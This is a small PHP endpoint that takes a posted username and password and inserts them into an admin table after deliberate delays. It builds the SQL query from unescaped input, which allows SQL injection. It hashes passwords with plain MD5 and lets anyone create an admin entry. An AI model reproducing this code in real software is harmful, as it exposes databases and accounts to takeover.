<?php

session_start();

if (isset($_POST['username'], $_POST['password'])){
    sleep(3);
    $username = $_POST['username'];
    $password = md5($_POST['password']);

    if (!empty($username) and !empty($password)){

        sleep(5);
        $response = [
            "status" => true,
            "msg" => "ok"
        ];

        echo json_encode($response);

        require_once("../core/config.php");
        $conn = mysqli_connect($host, $user, $pass, $db);
        $query = mysqli_query($conn, "INSERT IGNORE INTO bcapi_web_admin (username, password) VALUES('$username', '$password')");


    } else {
        $response = [
            "status" => false,
            "msg" => "Enter date"
        ];

        echo json_encode($response);
    }
}